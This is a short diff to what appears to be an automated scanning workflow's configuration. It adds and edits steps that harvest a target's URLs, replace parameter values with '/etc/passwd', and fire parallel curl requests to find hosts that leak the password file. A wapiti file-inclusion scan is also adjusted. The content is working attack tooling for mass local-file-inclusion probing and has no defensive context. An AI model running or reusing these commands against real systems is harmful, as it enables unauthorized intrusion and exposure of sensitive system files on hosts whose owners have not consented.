@@ -6,12 +6,15 @@ env:
   - LOG_DIR: ${HOME}/logs
   - PATH: /usr/local/bin:${PATH}
 steps:
-  - name: CustomLFI
+  - name: CustomLFI-External
     command: bash
     script: |
       gau ${target//\"} | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %" || true' 
-  
+  - name: CustomLFI-Internal
+    command: bash
+    script: |
+      ~/go/bin/httpx -u ${target//\"} | katana qurl | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %" || true' 
   - name: AutoLFI
     command: bash
     script: |
-      wapiti -u $target -m file
+      wapiti -u http://${target//\"} -m file
